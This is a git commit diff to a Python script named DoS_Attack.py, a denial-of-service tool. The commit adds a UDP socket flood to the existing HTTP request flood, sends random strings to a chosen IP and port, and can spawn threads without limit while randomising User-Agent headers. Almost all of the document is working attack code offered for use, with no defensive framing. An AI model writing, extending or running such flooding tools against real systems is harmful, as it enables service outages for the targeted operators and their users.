34a667f1f56236b454262ec1ebf701f3ebda1526
100LAR [Stolar Studio] <nikitstolarov@gmail.com>
2019-11-22 16:44:54 +0300

    1.4

--- DoS_Attack.py
+++ DoS_Attack.py
@@ -3,13 +3,21 @@
 #  [ Stolar Studio ]
 #
 
-ver = "0.1.3"
+ver = "0.1.4"
+
+def error(text):
+    print("\nERROR " + text)
+    input("\nPress enter...")
+    exit()
 
 import threading
 import requests
 import os
 import sys
 import configparser
+import socket
+import string
+import random
 
 #threading.stack_size(64*1024)
 
@@ -20,6 +28,7 @@ if not os.path.exists("settings.txt"):
     config.add_section("Settings")
     config.set("Settings", "infinity", "true")
     config.set("Settings", "UserAgent", "true")
+    config.set("Settings", "Length-String", "10")
 
     config.add_section("Visual")
     config.set("Visual", "print-logo", "true")
@@ -30,26 +39,36 @@ try:
     config.read("settings.txt")
     infinity = config.get("Settings", "infinity")
     User_Agent = config.get("Settings", "UserAgent")
+    LengthString = config.get("Settings", "Length-String")
 
     print_logo = config.get("Visual", "print-logo")
 except:
-    print("ERROR READ SETTINGS FILE")
-    input("\nPress enter...")
-    exit()
+    error("READ SETTINGS FILE")
 
 infinity_bool = True if infinity == 'true' or infinity == 'True' else False
 User_Agent_bool = True if User_Agent == 'true' or User_Agent == 'True' else False
 
 print_logo_bool = True if print_logo == 'true' or print_logo == 'True' else False
 
+def get_ip():
+    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    try:
+        s.connect(('10.255.255.255', 1))
+        ip = s.getsockname()[0]
+    except Exception:
+        ip = '127.0.0.1'
+    finally:
+        s.close()
+    return ip
+
 if print_logo_bool:
     print("""
-   _____ _                     _____        _____           _   _             _    
-  / ____| |                   |  __ \      / ____|     /\  | | | |           | |   
+   _____ _                     _____        _____           _   _             _
+  / ____| |                   |  __ \      / ____|     /\  | | | |           | |
  | (___ | |_ ___  _ __   ___  | |  | | ___| (___      /  \ | |_| |_ __ _  ___| | __
   \___ \| __/ _ \| '_ \ / _ \ | |  | |/ _ \\___  \    / /\ \| __| __/ _` |/ __| |/ /
-  ____) | || (_) | | | |  __/ | |__| | (_) |___) |  / ____ \ |_| || (_| | (__|   < 
- |_____/ \__\___/|_| |_|\___| |_____/ \___/_____/  /_/    \_\__|\__\__,_|\___|_|\_\                                                                                                                                                                     
+  ____) | || (_) | | | |  __/ | |__| | (_) |___) |  / ____ \ |_| || (_| | (__|   <
+ |_____/ \__\___/|_| |_|\___| |_____/ \___/_____/  /_/    \_\__|\__\__,_|\___|_|\_\
 """)
 else:
     print("Stone DoS Attack")
@@ -60,26 +79,59 @@ if User_Agent_bool:
     ua = UserAgent()
 
 #print(ua.random)
+print("Select type attack")
+print("1)REQUEST (HTTP)")
+print("2)SOCKET")
+type = input("type (num) = ")
 
-addr = input("IP : ")
-
-if not infinity_bool:
-    count = input("Count Thread : ")
+try:
+    if int(type) < 1 or int(type) > 2:
+        error("TYPE")
+except:
+    error("TYPE")
 
 print('-' * 35)
 
-def dos():
+addr = input("IP : ")
+if int(type) == 2:
+    port = input("PORT : ")
+    try:
+        server = (addr, int(port))
+    except:
+        error("PORT")
+
+    s = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
+    s.bind((get_ip(),0))
+    s.setblocking(0)
+
+print('-' * 35)
+
+if not infinity_bool:
+    count = input("Count Thread : ")
+    print('-' * 35)
+
+
+
+def randomString(stringLength=10):
+    letters = string.ascii_lowercase
+    return ''.join(random.choice(letters) for i in range(stringLength))
+
+def dos_req():
     while True:
         try:
             if User_Agent_bool:
                 header = {'User-Agent':str(ua.random)}
-                #htmlContent = requests.get("http://"+addr, headers=header)
                 requests.get("http://"+addr, headers=header)
             else:
                 requests.get("http://"+addr)
-            #print(htmlContent)
         except:
-            #print("ERROR")
+            pass
+
+def dos_socket():
+    while True:
+        try:
+            s.sendto(randomString(int(LengthString)).encode("utf-8"),server)
+        except:
             pass
 
 counts = 0
@@ -87,7 +139,10 @@ counts = 0
 if infinity_bool:
     while True:
         try:
-            threading.Thread(target=dos).start()
+            if int(type) == 1:
+                threading.Thread(target=dos_req).start()
+            elif int(type) == 2:
+                threading.Thread(target=dos_socket).start()
             counts += 1
             sys.stdout.write('\r')
             sys.stdout.write("PROCESS " + str(counts) + " STARTED")
@@ -98,11 +153,13 @@ if infinity_bool:
             break
 else:
     for i in range(int(count)):
-        threading.Thread(target=dos).start()
+        if int(type) == 1:
+            threading.Thread(target=dos_req).start()
+        elif int(type) == 2:
+            threading.Thread(target=dos_socket).start()
         sys.stdout.write('\r')
         sys.stdout.write("PROCESS " + str(i+1) + " STARTED")
         sys.stdout.flush()
-        
+
     sys.stdout.write('\n')
     print("\nALL STARTED")
-        
